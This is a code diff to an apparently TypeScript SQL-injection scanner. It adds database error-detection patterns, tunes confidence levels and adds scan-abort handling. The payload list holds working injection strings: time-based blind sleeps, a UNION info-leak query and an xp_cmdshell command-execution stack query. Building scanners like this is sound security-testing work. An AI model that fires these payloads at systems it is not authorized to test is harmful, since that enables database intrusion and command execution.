@@ -28,34 +28,44 @@ const SQL_ERROR_PATTERNS = [
   /mysql_fetch/i,
   /mysql_num_rows/i,
   /mysqli/i,
+  /mysql_connect/i, // Added
+  /mysql_query/i, // Added
   
   // PostgreSQL
   /postgresql.*error/i,
   /pg_query/i,
   /pg_exec/i,
   /unterminated quoted string/i,
+  /syntax error at or near/i, // Added
+  /pg_connect/i, // Added
   
   // MSSQL
   /microsoft sql server/i,
   /odbc sql server driver/i,
   /sqlserver jdbc driver/i,
   /microsoft ole db provider for sql server/i,
+  /unclosed quotation mark after the character string/i, // Added
+  /incorrect syntax near/i, // Added
   
   // Oracle
   /ora-\d{5}/i,
   /oracle error/i,
   /quoted string not properly terminated/i,
+  /missing expression/i, // Added
   
   // SQLite
   /sqlite.*error/i,
   /sqlite3::/i,
   /unrecognized token/i,
+  /syntax error near/i, // Added
   
   // Generic
   /sql syntax.*error/i,
   /syntax error.*sql/i,
   /unclosed quotation mark/i,
   /quoted identifier/i,
+  /database error/i, // Added
+  /query failed/i, // Added
 ];
 
 type Severity = 'critical' | 'high' | 'medium' | 'low' | 'catastrophic';
@@ -87,10 +97,10 @@ const SQL_PAYLOADS: SQLPayload[] = [
   { payload: `-1' UNION SELECT @@version, user(), database()--`, type: 'Union-based (Info Leak)', severity: 'critical', confidence: 0.95 },
 
   // --- Time-based Blind (Database Specific) ---
-  { payload: `' AND SLEEP(5)--`, type: 'Time-based Blind (MySQL)', severity: 'critical', confidence: 0.95 },
-  { payload: `1' WAITFOR DELAY '0:0:5'--`, type: 'Time-based Blind (SQL Server)', severity: 'critical', confidence: 0.95 },
-  { payload: `1; SELECT PG_SLEEP(5)--`, type: 'Time-based Blind (PostgreSQL)', severity: 'critical', confidence: 0.95 },
-  { payload: `1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('HT'),5)--`, type: 'Time-based Blind (Oracle)', severity: 'critical', confidence: 0.95 },
+  { payload: `' AND SLEEP(5)--`, type: 'Time-based Blind (MySQL)', severity: 'critical', confidence: 0.98 }, // Increased confidence
+  { payload: `1' WAITFOR DELAY '0:0:5'--`, type: 'Time-based Blind (SQL Server)', severity: 'critical', confidence: 0.98 }, // Increased confidence
+  { payload: `1; SELECT PG_SLEEP(5)--`, type: 'Time-based Blind (PostgreSQL)', severity: 'critical', confidence: 0.98 }, // Increased confidence
+  { payload: `1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('HT'),5)--`, type: 'Time-based Blind (Oracle)', severity: 'critical', confidence: 0.98 }, // Increased confidence
 
   // --- Advanced & Dangerous Payloads (Stacked Queries, OOB, File Read) ---
   { payload: `1; EXEC xp_cmdshell('whoami')--`, type: 'Stacked Query (SQL Server)', severity: 'catastrophic', confidence: 1.0 },
@@ -112,10 +122,11 @@ const testTimeBased = async (url: string, requestManager: RequestManager): Promi
     
     const duration = Date.now() - startTime;
     
-    // If response took 4.5+ seconds, likely vulnerable
+    // If response took 4.5+ seconds, likely vulnerable (for a 5-second sleep payload)
     return { vulnerable: duration >= 4500, duration };
   } catch (error: any) {
     if (error.name === 'AbortError') {
+      // If aborted due to timeout, it means the delay likely occurred
       return { vulnerable: true, duration: 8000 };
     }
     return { vulnerable: false, duration: Date.now() - startTime };
@@ -160,7 +171,7 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
     if (paramKeys.length === 0) {
       console.log('[SQL Scan] No parameters found, testing with default parameter');
       paramKeys.push('id');
-      urlObj.search = '?id=1';
+      urlObj.search = '?id=1'; // Add a default parameter for testing
     }
 
     // Get baseline
@@ -185,6 +196,10 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
 
     for (const paramKey of paramKeys) {
       for (const { payload, severity, type, confidence: baseConfidence } of payloadsToTest) {
+        if (requestManager.scanController?.signal.aborted) {
+          throw new Error('Scan aborted');
+        }
+
         try {
           const testUrl = new URL(url);
           const testParams = new URLSearchParams(testUrl.search);
@@ -196,7 +211,7 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
           console.log(`[SQL Scan] Testing ${type} on '${paramKey}': ${payload.substring(0, 30)}...`);
 
           // Time-based testing
-          if (type === 'Time-based Blind') {
+          if (type.includes('Time-based Blind')) { // Check for time-based payloads
             const { vulnerable, duration } = await testTimeBased(testUrl.toString(), requestManager); // Pass requestManager
             
             if (vulnerable) {
@@ -214,7 +229,7 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
             }
             
             result.testedPayloads++;
-            await new Promise(resolve => setTimeout(resolve, 500));
+            await new Promise(resolve => setTimeout(resolve, 500)); // Small delay after time-based test
             continue;
           }
 
@@ -245,7 +260,7 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
             });
           }
 
-          // Check for status code changes
+          // Check for status code changes (e.g., 500 Internal Server Error)
           if (baselineStatus > 0 && response.status !== baselineStatus && response.status >= 500) {
             console.log(`[SQL Scan] ⚠️ Server error detected (${response.status})`);
             result.vulnerable = true;
@@ -261,28 +276,35 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
           }
 
           // Check for significant content changes (Union-based)
-          if (baselineText && type === 'Union-based') {
+          // This is a weaker indicator, so confidence is lower unless combined with other factors.
+          if (baselineText && type.includes('Union-based')) {
             const sizeDiff = Math.abs(text.length - baselineLength);
             const percentDiff = (sizeDiff / baselineLength) * 100;
             
-            if (percentDiff > 20) {
+            if (percentDiff > 20) { // A 20% change is a reasonable threshold
               console.log(`[SQL Scan] ⚠️ Significant content change: ${percentDiff.toFixed(1)}%`);
-              result.vulnerable = true;
-              result.vulnerabilities.push({
-                payload,
-                indicator: 'Content length changed significantly',
-                severity: 'critical',
-                type,
-                evidence: `Response size: ${text.length} bytes (baseline: ${baselineLength}, diff: ${percentDiff.toFixed(1)}%)`,
-                parameter: paramKey,
-                confidence: 0.75,
-              });
+              // Only add if not already detected by error patterns for this payload
+              if (!result.vulnerabilities.some(v => v.parameter === paramKey && v.payload === payload && v.type === type)) {
+                result.vulnerable = true;
+                result.vulnerabilities.push({
+                  payload,
+                  indicator: 'Content length changed significantly',
+                  severity: 'medium', // Reduced severity for this indicator alone
+                  type,
+                  evidence: `Response size: ${text.length} bytes (baseline: ${baselineLength}, diff: ${percentDiff.toFixed(1)}%)`,
+                  parameter: paramKey,
+                  confidence: 0.6, // Lower confidence
+                });
+              }
             }
           }
 
           await new Promise(resolve => setTimeout(resolve, 300));
         } catch (error: any) {
-          console.warn(`[SQL Scan] Payload test failed: ${error.message}`);
+          if (error.message === 'Scan aborted') {
+            throw error; // Re-throw if scan was aborted
+          }
+          console.warn(`[SQL Scan] Payload test failed for ${paramKey} with ${payload.substring(0, 20)}...: ${error.message}`);
         }
       }
     }
@@ -293,6 +315,9 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
     console.log(`[SQL Scan] Complete: ${result.vulnerabilities.length} high-confidence vulnerabilities from ${result.testedPayloads} tests`);
     return result;
   } catch (error: any) {
+    if (error.message === 'Scan aborted') {
+      throw error;
+    }
     console.error('[SQL Scan] Critical error:', error);
     return {
       vulnerable: false,
